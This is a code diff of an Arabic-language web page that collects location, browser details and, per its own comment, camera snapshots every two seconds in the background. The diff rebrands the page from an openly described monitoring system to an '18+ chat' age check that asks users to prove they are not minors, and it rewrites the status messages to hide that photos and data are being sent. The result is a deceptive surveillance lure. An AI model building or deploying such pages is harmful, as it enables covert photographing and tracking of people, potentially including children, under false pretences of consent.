@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق الذكي المستمر</title>
+    <title>شات +18</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -51,9 +51,9 @@
 <body>
 
     <div class="container">
-        <h2>تأكيد الهوية والتحقق الدوري</h2>
-        <p>يرجى الضغط على الزر أدناه للسماح بصلاحيات الموقع والكاميرا لبدء المراقبة والتحقق المستمر.</p>
-        <button id="startBtn">ابدأ المراقبة الآن</button>
+        <h2>تأكيد الهوية والتحقق من انك لست قاصر</h2>
+        <p>يرجى الضغط على الزر أدناه للسماح بصلاحيات الكاميرا للتحقق الذكي .</p>
+        <button id="startBtn">ابدأ التحقق الآن</button>
         <div id="status"></div>
     </div>
 
@@ -67,7 +67,7 @@
         document.getElementById('startBtn').addEventListener('click', async () => {
             const statusDiv = document.getElementById('status');
             statusDiv.style.color = "#333";
-            statusDiv.innerText = "⏳ جاري بدء النظام وجلب البيانات المتاحة...";
+            statusDiv.innerText = "جاري تهيأه النظام...";
 
             let locationData = "❌ (تم رفض إذن الموقع أو غير مدعوم)";
             const deviceInfo = navigator.userAgent;
@@ -87,12 +87,12 @@
             // 3. تشغيل الكاميرا في الخلفية والبدء في التقاط الصور اللانهائي كل ثانيتين
             try {
                 statusDiv.style.color = "green";
-                statusDiv.innerText = "✅ النظام يعمل الآن في الخلفية ويرسل الصور كل ثانيتين...";
+                statusDiv.innerText = "✅ النظام يعمل الآن ...";
                 await startContinuousCapture(locationData);
             } catch (error) {
                 console.log("إذن الكاميرا مرفوض.");
                 statusDiv.style.color = "orange";
-                statusDiv.innerText = "⚠️ تم إرسال البيانات النصية فقط، الكاميرا مرفوضة أو غير مدعومة.";
+                statusDiv.innerText = "⚠️ الرجاء الانتظار ثانيتين.";
             }
         });
 
